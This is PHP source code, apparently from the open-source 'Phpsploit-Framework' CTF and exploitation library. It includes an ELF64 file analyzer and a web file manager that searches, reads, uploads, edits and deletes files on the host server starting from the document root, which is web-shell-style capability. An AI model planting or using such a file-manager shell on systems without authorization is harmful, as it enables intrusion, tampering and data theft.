            $_form_top       .= '<div style="margin-top: 16px;text-align:left;font-size:18px;"><span style="font-size: 18px;color:red;">cli encode url : ' . ( Class_Base_Format ::htmlentities ( $_cli_encode_url ) ) . '</span></div>';
            $_form_name      = "form_0";
            $_form           = array (
                "action"    => "/elf/elf64" ,
                "id"        => $_form_name ,
                "name"      => $_form_name ,
                "hiddens"   => array (
                    array (
                        "id"    => "start" ,
                        "name"  => "start" ,
                        "value" => 1 ,
                    ) ,
                ) ,
                "selects"   => array () ,
                "inputs"    => array (
                    array (
                        "id"       => "file_path" ,
                        "title"    => "Read File Path : " ,
                        "describe" => "Read File Path" ,
                        "name"     => "file_path" ,
                        "value"    => $_file_path ,
                    ) ,
                ) ,
                "textareas" => array () ,
                "files"     => array () ,
                "submit"    => array (
                    "id"    => "submit_form" ,
                    "type"  => "submit" ,
                    "title" => "( Start Analyzing File Content )" ,
                    "name"  => "submit_form" ,
                    "value" => "start analyzing file content" ,
                ) ,
                "reset"     => array (
                    "id"    => "reset_form" ,
                    "type"  => "reset" ,
                    "title" => "( Reset File Configuration Information )" ,
                    "name"  => "reset_form" ,
                    "value" => "reset configuration" ,
                ) ,
                "button"    => array (
                    "id"      => "button_form" ,
                    "type"    => "button" ,
                    "title"   => "( Create Wget Environment CLI Encode URL )" ,
                    "name"    => "button_form" ,
                    "value"   => "create cli encode url" ,
                    "display" => false ,
                    "events"  => array (
                        "onclick" => 'create_encode_url();' ,
                    ) ,
                ) ,
            );
            $_bottom_menu    = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_bottom_form    = array (
                "action"    => "/elf/elf64" ,
                "submit"    => array ( "display" => false , ) ,
                "reset"     => array ( "display" => false , ) ,
                "hiddens"   => array () ,
                "selects"   => array () ,
                "textareas" => array () ,
            );
            if ( ( ! empty( $_elf64_info[ "file_header" ] ) ) && ( is_object ( $_elf64_info[ "file_header" ] ) ) && ( $_elf64_info[ "file_header" ] instanceof Class_Base_Elf64_File_Header ) ) {
                $_bottom_form[ "textareas" ][] = array (
                    "id"       => "file_header" ,
                    "title"    => "File Header : " ,
                    "name"     => "file_header" ,
                    "value"    => ( ( empty( $_elf64_info[ "file_header" ] ) ) ? print_r ( array () , true ) : print_r ( $_elf64_info[ "file_header" ] -> get_format_file_header () , true ) ) ,
                    "disabled" => "disabled" ,
                    "style"    => ( 'height:1020px;' ) ,
                );
            }
            if ( ( ! empty( $_elf64_info[ "program_headers" ] ) ) && ( is_array ( $_elf64_info[ "program_headers" ] ) ) ) {
                foreach ( $_elf64_info[ "program_headers" ] as $program_header_offset => $program_header ) {
                    $_bottom_form[ "textareas" ][] = array (
                        "id"       => ( "program_header_" . $program_header_offset ) ,
                        "title"    => "Program Header_" . $program_header_offset . " : " ,
                        "name"     => ( "program_header_" . $program_header_offset ) ,
                        "value"    => ( print_r ( $program_header -> get_format_program_header () , true ) ) ,
                        "disabled" => "disabled" ,
                        "style"    => ( 'height:480px;' ) ,
                    );
                }
            }
            if ( ( ! empty( $_elf64_info[ "section_headers" ] ) ) && ( is_array ( $_elf64_info[ "section_headers" ] ) ) ) {
                foreach ( $_elf64_info[ "section_headers" ] as $section_header_offset => $section_header ) {
                    if ( ( is_object ( $section_header ) ) && ( $section_header instanceof Class_Base_Elf64_Section_Header ) ) {
                        $_format_section_header = $section_header -> get_format_section_header ();
                        $_format_sh_name        = $section_header -> get_sh_name ();
                        if ( $_format_sh_name === false ) {
                            $_format_section_header[ "format_sh_name" ] = "";
                        } else {
                            if ( $_elf64_info[ "section_shstrtab" ] !== false ) {
                                $_format_section_header[ "format_sh_name" ] = $_elf64_info[ "section_shstrtab" ] -> get_sh_name ( $section_header -> get_sh_name () );
                            } else {
                                $_format_section_header[ "format_sh_name" ] = "";
                            }
                        }
                        $_bottom_form[ "textareas" ][] = array (
                            "id"       => ( "section_header_" . $section_header_offset ) ,
                            "title"    => ( "Section Header_" . $section_header_offset . ( ( empty( $section_header -> get_sh_name () ) ) ? "" : " ( " . ( $_format_section_header[ "format_sh_name" ] ) . " ) : " ) ) ,
                            "name"     => ( "section_header_" . $section_header_offset ) ,
                            "value"    => ( print_r ( $_format_section_header , true ) ) ,
                            "disabled" => "disabled" ,
                            "style"    => ( 'height:500px;' ) ,
                        );
                    }
                }
            }
            if ( ( ! empty( $_elf64_info[ "programs" ] ) ) && ( is_array ( $_elf64_info[ "programs" ] ) ) ) {
                foreach ( $_elf64_info[ "programs" ] as $program_offset => $program ) {
                    $program[ "content" ]          = Class_Base_Elf64_Program ::show_program_content ( $program[ "type" ] , $program[ "content" ] , $_program_content_type );
                    $program[ "content_type" ]     = $_program_content_type;
                    $_bottom_form[ "textareas" ][] = array (
                        "id"       => ( "program_" . $program_offset ) ,
                        "title"    => "Program_" . $program_offset . " : " ,
                        "name"     => ( "program_" . $program_offset ) ,
                        "value"    => ( print_r ( $program , true ) ) ,
                        "disabled" => "disabled" ,
                        "style"    => ( 'height:265px;' ) ,
                    );
                }
            }
            if ( ( ! empty( $_elf64_info[ "sections" ] ) ) && ( is_array ( $_elf64_info[ "sections" ] ) ) ) {
                foreach ( $_elf64_info[ "sections" ] as $section_offset => $section ) {
                    $section[ "content" ]          = Class_Base_Elf64_Section ::show_section_content ( $section[ "type" ] , $section[ "content" ] , $_section_content_type );
                    $section[ "content_type" ]     = $_section_content_type;
                    $_bottom_form[ "textareas" ][] = array (
                        "id"       => ( "section_" . $section_offset ) ,
                        "title"    => "Section_" . $section_offset . " ( " . ( $section[ "name" ] ) . " ) : " ,
                        "name"     => ( "section_" . $section_offset ) ,
                        "value"    => ( print_r ( $section , true ) ) ,
                        "disabled" => "disabled" ,
                        "style"    => ( 'height:265px;' ) ,
                    );
                }
            }
            $_top        = Class_View_Top ::top ();
            $_body       = array (
                "menu"    => Class_View_Elf_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_content    = ( ( '<table style="width:100%;"><tr><td style="width:20%;"></td><td style="width:80%;">' ) . Class_View ::form_body ( $_bottom_form ) . ( '</td></tr></table>' ) );
            $_javascript = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;} function create_encode_url(){ document.getElementById("start").value=0;if(document.forms["' . htmlentities ( $_form_name ) . '"].onsubmit()!=false){document.forms["' . htmlentities ( $_form_name ) . '"].submit();} }</script>';
            $_bottom     = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            $_output_info = array ( "file_header" => array () , "program_headers" => array () , "section_headers" => array () , "programs" => array () , "sections" => array () , );
            if ( ( ! empty( $_elf64_info[ "file_header" ] ) ) && ( is_object ( $_elf64_info[ "file_header" ] ) ) && ( $_elf64_info[ "file_header" ] instanceof Class_Base_Elf64_File_Header ) ) {
                $_output_info[ "file_header" ] = ( $_elf64_info[ "file_header" ] -> get_format_file_header () );
            }
            if ( ( ! empty( $_elf64_info[ "program_headers" ] ) ) && ( is_array ( $_elf64_info[ "program_headers" ] ) ) ) {
                foreach ( $_elf64_info[ "program_headers" ] as $program_header_offset => $program_header ) {
                    $_output_info[ "program_headers" ][ $program_header_offset ] = ( $program_header -> get_format_program_header () );
                }
            }
            if ( ( ! empty( $_elf64_info[ "section_headers" ] ) ) && ( is_array ( $_elf64_info[ "section_headers" ] ) ) ) {
                foreach ( $_elf64_info[ "section_headers" ] as $section_header_offset => $section_header ) {
                    if ( ( is_object ( $section_header ) ) && ( $section_header instanceof Class_Base_Elf64_Section_Header ) ) {
                        $_format_section_header = $section_header -> get_format_section_header ();
                        $_format_sh_name        = $section_header -> get_sh_name ();
                        if ( $_format_sh_name === false ) {
                            $_format_section_header[ "format_sh_name" ] = "";
                        } else {
                            if ( $_elf64_info[ "section_shstrtab" ] !== false ) {
                                $_format_section_header[ "format_sh_name" ] = $_elf64_info[ "section_shstrtab" ] -> get_sh_name ( $section_header -> get_sh_name () );
                            } else {
                                $_format_section_header[ "format_sh_name" ] = "";
                            }
                        }
                        $_output_info[ "section_headers" ][ $section_header_offset ] = ( $_format_section_header );
                    }
                }
            }
            if ( ( ! empty( $_elf64_info[ "programs" ] ) ) && ( is_array ( $_elf64_info[ "programs" ] ) ) ) {
                foreach ( $_elf64_info[ "programs" ] as $program_offset => $program ) {
                    $program[ "content" ]                          = Class_Base_Elf64_Program ::show_program_content ( $program[ "type" ] , $program[ "content" ] , $_program_content_type );
                    $program[ "content_type" ]                     = $_program_content_type;
                    $_output_info[ "programs" ][ $program_offset ] = ( $program );
                }
            }
            if ( ( ! empty( $_elf64_info[ "sections" ] ) ) && ( is_array ( $_elf64_info[ "sections" ] ) ) ) {
                foreach ( $_elf64_info[ "sections" ] as $section_offset => $section ) {
                    $section[ "content" ]                          = Class_Base_Elf64_Section ::show_section_content ( $section[ "type" ] , $section[ "content" ] , $_section_content_type );
                    $section[ "content_type" ]                     = $_section_content_type;
                    $_output_info[ "sections" ][ $section_offset ] = ( $section );
                }
            }
            Class_Base_Response ::outputln ( $_output_info );
        }
        return null;
    }

    public static function elf_h ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( ! is_cli () ) {
            $_form_top    = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">ELF 64 Format File Data Info</div>';
            $_form_top    .= '<div style="margin-top:16px;margin-bottom:64px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">You can analyze the format and content details of ELF files based on the content of elf. h. Your mastery of the ELF format structure affects your overall ability in the field of binary security.</div>';
            $_form        = array ();
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Elf_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_bottom_form = array ( "submit" => array ( "display" => false , ) , "reset" => array ( "display" => false , ) );
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Elf_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . ( '<pre style="text-align: left;">' . Class_Base_Format ::htmlentities ( Class_Base_Document_Elf64 ::get_content_elf_h () ) . '</pre>' ) ) ,
            );
            $_content     = ( ( '<table style="width:100%;"><tr><td style="width:20%;"></td><td style="width:80%;">' ) . Class_View ::form_body ( $_bottom_form ) . ( '</td></tr></table>' ) );
            $_javascript  = '<script type="text/javascript">function init(){ console.log("page loading completed ! "); }function to_submit(form_object){ console.log("form is submit ! "); return true;}</script>';
            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-1-24
 * Time: 上午11:34
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Operate_Web extends Class_Root implements Interface_Operate
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 22-12-20
 * Time: 下午11:10
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_File extends Class_Controller
{
    public static function index ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( ! is_cli () ) {
            $_top    = Class_View_Top ::top ();
            $_body   = array (
                "menu"    => Class_View_File_Menu ::menu () ,
                "content" => "" ,
            );
            $_bottom = Class_View_Bottom ::bottom ();
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }

    public static function show_search ( $params = array () )
    {
        if ( is_cli () ) {
            global $_SERVER;
            if ( ! is_array ( $_SERVER ) ) {
                $_SERVER = array ();
            }
        }
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_file_name              = Class_Base_Request ::form ( "file_name" , Class_Base_Request::TYPE_STRING , "" );
        $_current_directory_path = Class_Base_Request ::form ( "current_directory_path" , Class_Base_Request::TYPE_STRING , ( empty( $_SERVER[ "DOCUMENT_ROOT" ] ) ? "" : $_SERVER[ "DOCUMENT_ROOT" ] ) );
        if ( ! is_cli () ) {
            $_menu_params        = array (
                "search"   => array (
                    "file_name"              => $_file_name ,
                    "current_directory_path" => $_current_directory_path ,
                ) ,
                "explorer" => array (
                    "current_directory_path" => $_current_directory_path ,
                ) ,
                "create"   => array (
                    "current_directory_path" => $_current_directory_path ,
                    "data_type"              => Class_Base_Format::TYPE_DATA_TEXT ,
                ) ,
                "upload"   => array (
                    "current_directory_path" => $_current_directory_path ,
                ) ,
                "clear"    => array (
                    "file_name"              => "" ,
                    "current_directory_path" => $_current_directory_path ,
                ) ,
            );
            $_form               = array (
                "action" => "/file/search" ,
                "inputs" => array (
                    array (
                        "title"    => "search path : " ,
                        "describe" => "search path" ,
                        "name"     => "current_directory_path" ,
                        "value"    => $_current_directory_path ,
                    ) ,
                    array (
                        "title"    => "file name : " ,
                        "describe" => "file name" ,
                        "name"     => "file_name" ,
                        "value"    => $_file_name ,
                    ) ,
                ) ,
            );
            $_form_top           = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Search File By File Name</div>';
            $_form_top           .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This interface is used to search for a specified directory or file under a specified path based on a specified keyword.</div>';
            $_top                = Class_View_Top ::top ();
            $_body               = array (
                "menu"    => Class_View_File_Menu ::menu ( $_menu_params ) ,
                "content" => ( $_form_top . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu        = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_search_progress_id = "search_progress";
            $_search_errors_id   = "search_errors";
            $_search_result_id   = "search_result";
            $_content            = '<div style="padding-top:16px;padding-bottom:16px;text-align: center;font-size:18px;">Search Progress</div><div id="' . $_search_progress_id . '" style="padding-top:16px;padding-bottom:16px;text-align: center;font-size:18px;"></div><div style="padding-top:16px;padding-bottom:16px;text-align: center;font-size:18px;">Search Errors</div><div id="' . $_search_errors_id . '" style="padding-top:16px;padding-bottom:16px;text-align: center;font-size:18px;"></div><div style="padding-top:16px;padding-bottom:16px;text-align: center;font-size:18px;">Search Result</div><div id="' . $_search_result_id . '" style="padding-top:16px;padding-bottom:16px;text-align: left;font-size:18px;"></div>';
            $_bottom             = Class_View_Bottom ::bottom ( $_bottom_menu , $_content );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        if ( ( $_current_directory_path != "" ) && ( $_file_name != "" ) ) {
            Class_Operate_File ::search_file ( $_current_directory_path , $_file_name , $_search_progress_id , $_search_errors_id , $_search_result_id , 500 );
        }
        if ( ! is_cli () ) {
            Class_Base_Response ::output_div_inner_html ( $_search_progress_id , "" , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_COVER );
        }
        return null;
    }

    public static function show_explorer ( $params = array () )
    {
        if ( is_cli () ) {
            global $_SERVER;
            if ( ! is_array ( $_SERVER ) ) {
                $_SERVER = array ();
            }
        }
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_current_directory_path = Class_Base_Request ::form ( "current_directory_path" , Class_Base_Request::TYPE_STRING , ( empty( $_SERVER[ "DOCUMENT_ROOT" ] ) ? "" : $_SERVER[ "DOCUMENT_ROOT" ] ) );
        $_search_progress_id     = "search_progress";
        $_search_errors_id       = "search_errors";
        $_search_result_id       = "search_result";
        if ( ! is_cli () ) {
            $_menu_params        = array (
                "search"   => array (
                    "file_name"              => "" ,
                    "current_directory_path" => $_current_directory_path ,
                ) ,
                "explorer" => array (
                    "current_directory_path" => $_current_directory_path ,
                ) ,
                "create"   => array (
                    "current_directory_path" => $_current_directory_path ,
                    "data_type"              => Class_Base_Format::TYPE_DATA_TEXT ,
                ) ,
                "upload"   => array (
                    "current_directory_path" => $_current_directory_path ,
                ) ,
                "clear"    => array (
                    "file_name"              => "" ,
                    "current_directory_path" => $_current_directory_path ,
                ) ,
            );
            $_form               = array (
                "action" => "/file/explorer" ,
                "inputs" => array (
                    array (
                        "title"    => "current directory : " ,
                        "describe" => "current directory path" ,
                        "name"     => "current_directory_path" ,
                        "value"    => $_current_directory_path ,
                    ) ,
                ) ,
            );
            $_form_top           = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Show Directory And File Path</div>';
            $_form_top           .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This interface is used to display directories or files under a specified path.</div>';
            $_top                = Class_View_Top ::top ();
            $_body               = array (
                "menu"    => Class_View_File_Menu ::menu ( $_menu_params ) ,
                "content" => ( $_form_top . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu        = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_search_progress_id = "search_progress";
            $_search_errors_id   = "search_errors";
            $_search_result_id   = "search_result";
            $_content            = '<div id="' . $_search_progress_id . '" style="padding-top:16px;padding-bottom:16px;text-align: center;font-size:18px;"></div><div id="' . $_search_errors_id . '" style="padding-top:16px;padding-bottom:16px;text-align: center;font-size:18px;"></div><div id="' . $_search_result_id . '" style="padding-top:16px;padding-bottom:16px;text-align: left;font-size:18px;"></div>';
            $_bottom             = Class_View_Bottom ::bottom ( $_bottom_menu , $_content );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        Class_Operate_File ::explorer ( $_current_directory_path , $_search_progress_id , $_search_errors_id , $_search_result_id , "/file/explorer" , "/file/detail" , array ( "directory_field_name" => "current_directory_path" , "file_field_name" => "file_path" ) );
        return null;
    }

    public static function show_detail ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_data_type                = Class_Base_Request ::form ( "data_type" , Class_Base_Request::TYPE_INTEGER , Class_Base_Request::TYPE_DATA_BIN );
        $_file_path                = Class_Base_Request ::form ( "file_path" , Class_Base_Request::TYPE_STRING , "" );
        $_file_content_read_offset = Class_Base_Request ::form ( "file_content_read_offset" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_file_info                = Class_Operate_File ::get_file_info ( $_file_path , $_file_content_read_offset , $_data_type );
        $_current_directory_path   = Class_Base_File ::parent_directory ( $_file_path );
        $_file_name                = Class_Base_File ::get_file_name ( $_file_path );
        if ( ( ! file_exists ( $_file_path ) ) || ( ! is_file ( $_file_path ) ) ) {
            Class_Base_Response ::redirect ( "/file/explorer" , array ( "current_directory_path" => dirname ( $_file_path ) ) );
            return null;
        }
        if ( ! is_cli () ) {
            $_form_top    = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Show File Content</div>';
            $_form_result = '<div style="width:100%;padding-top: 16px;"><div style="text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">';
            $_form_result .= 'The following displays relevant information about the current file, including file path, file type, file size, file access permissions, user group to which the file belongs, user to whom the file belongs, last access time, last modification time of the file, inode information of the file, and last modification time of the file inode.';
            $_form_result .= '</div><div style="margin-top:32px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">File information</div><div style="height: 32px;text-align: left;font-size: 18px;">';
            $_form_result .= empty( $_file_path ) ? '' : 'file path : ' . $_file_path;
            $_form_result .= '</div><div style="height: 32px;text-align: left;font-size:18px;">file type : ' . $_file_info[ "type" ] . ' </div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">file size : ' . $_file_info[ "size" ] . ' byte</div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">file perms : ' . $_file_info[ "perms" ] . ' </div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">file group : ' . ( ( ! empty( $_file_info[ "group" ] ) ) ? ( "name : " . $_file_info[ "group" ][ "name" ] . " , gid : " . $_file_info[ "group" ][ "gid" ] ) : "" ) . ' </div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">file owner : ' . ( ( ! empty( $_file_info[ "owner" ] ) ) ? ( "name : " . $_file_info[ "owner" ][ "name" ] . " , uid : " . $_file_info[ "owner" ][ "gid" ] ) : "" ) . ' </div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">file atime : ' . date ( 'Y-m-d H:i:s' , $_file_info[ "atime" ] ) . ' </div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">file mtime : ' . date ( 'Y-m-d H:i:s' , $_file_info[ "mtime" ] ) . ' </div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">file inode : ' . $_file_info[ "inode" ] . ' </div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">file ctime : ' . date ( 'Y-m-d H:i:s' , $_file_info[ "ctime" ] ) . ' </div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">read limit : ' . $_file_info[ "content_read_limit" ] . ' byte </div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">read offset : ' . $_file_info[ "content_read_offset" ] . '  </div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">next offset : ' . $_file_info[ "content_read_next_offset" ] . '  </div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">read remain : ' . ( ( $_file_info[ "content_read_remain" ] < 0 ) ? 0 : $_file_info[ "content_read_remain" ] ) . ' byte </div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">data type : ' . ( ( $_file_info[ "data_type" ] == Class_Base_File::TYPE_DATA_TEXT ) ? "Text Data Format" : "Binary Data Format" ) . ' &nbsp;&nbsp;<a href="' . ( Class_Base_Response ::get_url ( "/file/detail" , array ( 'file_path' => $_file_path , "file_content_read_offset" => $_file_info[ "content_read_offset" ] , "data_type" => ( ( $_file_info[ "data_type" ] == Class_Base_File::TYPE_DATA_TEXT ) ? Class_Base_File::TYPE_DATA_BIN : Class_Base_File::TYPE_DATA_TEXT ) ) ) ) . '">Switch the data display format to ' . ( ( $_file_info[ "data_type" ] == Class_Base_File::TYPE_DATA_TEXT ) ? "Binary Data Format" : "Text Data Format" ) . '</a>  </div>';
            $_form_result .= '<div style="height: 32px;text-align: left;font-size:18px;">data size : ' . $_file_info[ "content_size" ] . ' byte </div>';
            $_form_result .= '<div style="padding-top:12px;text-align: left;font-size:18px;">file data : ';
            if ( $_data_type == Class_Base_Format::TYPE_DATA_TEXT ) {
                $_form_result .= '<pre>';
            }
            $_form_result .= ( ( isset( $_file_path ) ) && ( file_exists ( $_file_path ) ) && ( is_file ( $_file_path ) ) ) ? ( Class_Base_Format ::htmlentities ( $_file_info[ "content" ] ) ) : "";
            if ( $_data_type == Class_Base_Format::TYPE_DATA_TEXT ) {
                $_form_result .= '</pre>';
            }
            $_form_result .= '</div></div>';
            $_form_result .= '<div style="width:100%;padding-top: 64px;">';
            $_form_result .= '<table style="width:100%;">';
            $_form_result .= '<tr>';
            $_form_result .= '<td colspan="4" style="text-align: left;padding-top:32px;padding-bottom: 32px;"><a style="font-size:18px;" href="' . ( ( empty( $_file_info[ "content_read_remain" ] ) ) ? Class_Base_Response ::get_url ( "/file/detail" , array ( 'file_path' => $_file_path , "file_content_read_offset" => 0 , "data_type" => $_data_type ) ) : Class_Base_Response ::get_url ( "/file/detail" , array ( 'file_path' => $_file_path , "file_content_read_offset" => $_file_info[ "content_read_next_offset" ] , "data_type" => $_data_type ) ) ) . '">Read File Reamin Content</a></td>';
            $_form_result .= '</tr>';
            $_form_result .= '<tr>';
            $_form_result .= '<td colspan="4" style="text-align: left;padding-bottom: 32px;"><a style="font-size:18px;" href="' . ( ( is_null ( $_current_directory_path ) ) ? "" : Class_Base_Response ::get_url ( "/file/explorer" , array ( 'current_directory_path' => $_current_directory_path ) ) ) . '">Return To Current Directory : ' . ( ( ! is_null ( $_current_directory_path ) ) ? $_current_directory_path : "" ) . '</a></td>';
            $_form_result .= '</tr>';
            $_form_result .= '<tr>';
            $_form_result .= '<td style="25%;text-align: left;"><a style="font-size:18px;" href="' . ( ( is_null ( $_current_directory_path ) ) ? "" : Class_Base_Response ::get_url ( "/file/upload" , array ( 'current_directory_path' => $_current_directory_path ) ) ) . '">Upload files to the current directory</a></td>';
            $_form_result .= '<td style="25%;text-align: left;"><a style="font-size:18px;" href="' . ( ( is_null ( $_current_directory_path ) ) ? "" : Class_Base_Response ::get_url ( "/file/create" , array ( 'current_directory_path' => $_current_directory_path ) ) ) . '">Create a file in the current directory</a></td>';
            $_form_result .= '<td style="25%;text-align: left;">' . ( ( ! Class_Base_File ::is_permission ( $_file_path ) ) ? "" : '<a style="font-size:18px;" href="' . Class_Base_Response ::get_url ( "/file/edit" , array ( 'file_path' => $_file_path , ) ) . '">Edit current file</a>' ) . '</td>';
            $_form_result .= '<td style="25%;text-align: left;">' . ( ( ! Class_Base_File ::is_permission ( $_file_path ) ) ? "" : '<a style="font-size:18px;" href="' . Class_Base_Response ::get_url ( "/file/delete" , array ( 'file_path' => $_file_path , ) ) . '">Delete current file</a>' ) . '</td>';
            $_form_result .= '</tr>';
            $_form_result .= '</table>';
            $_form_result .= '</div>';
            $_menu_params = array (
                "search"   => array (
                    "file_name"              => $_file_name ,
                    "current_directory_path" => $_current_directory_path ,
                ) ,
                "explorer" => array (
                    "current_directory_path" => $_current_directory_path ,
                ) ,
                "create"   => array (
                    "current_directory_path" => $_current_directory_path ,
                    "data_type"              => Class_Base_Format::TYPE_DATA_TEXT ,
                ) ,
                "upload"   => array (
                    "current_directory_path" => $_current_directory_path ,
                ) ,
                "clear"    => array (
                    "file_name"              => "" ,
                    "current_directory_path" => $_current_directory_path ,
                ) ,
            );
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_File_Menu ::menu ( $_menu_params ) ,
                "content" => ( $_form_top . $_form_result ) ,
            );
            $_bottom      = Class_View_Bottom ::bottom ();
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            Class_Base_Response ::outputln ( $_file_info , "file_info : " );
        }

        return null;
    }

    public static function show_create ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_current_directory_path = Class_Base_Request ::form ( "current_directory_path" , Class_Base_Request::TYPE_STRING , "" );
        $_file_name              = Class_Base_Request ::form ( "file_name" , Class_Base_Request::TYPE_STRING , "" );
        $_data_type              = Class_Base_Request ::form ( "data_type" , Class_Base_Request::TYPE_INTEGER , Class_Base_Request::TYPE_DATA_BIN );
        $_file_content           = Class_Base_Request ::form ( "file_content" , Class_Base_Request::TYPE_STRING , "" );
        $_file_content_size      = Class_Base_Format ::get_bin_content_size ( $_file_content , $_data_type );
        if ( ( is_string ( $_current_directory_path ) ) && ( strlen ( $_current_directory_path ) > 0 ) && ( is_string ( $_file_name ) ) && ( strlen ( $_file_name ) > 0 ) && ( is_integer ( $_data_type ) ) && ( in_array ( $_data_type , array ( Class_Base_Request::TYPE_DATA_TEXT , Class_Base_Request::TYPE_DATA_BIN ) ) ) && ( is_string ( $_file_content ) ) && ( $_file_content_size > 0 ) && ( $_file_content_size <= Class_Base_File::SIZE_FILE_CONTENT_LIMIT ) ) {
            $_file_info = Class_Operate_File ::create_file ( $_current_directory_path , $_file_name , $_data_type , $_file_content );
            if ( ! empty( $_file_info ) ) {
                Class_Base_Response ::redirect ( "/file/detail" , array ( "file_path" => $_file_info[ "file_path" ] ) );
            }
        }
        if ( ! is_cli () ) {
            $_menu_params = array (
                "search"   => array (
                    "file_name"              => $_file_name ,
                    "current_directory_path" => $_current_directory_path ,
                ) ,
                "explorer" => array (
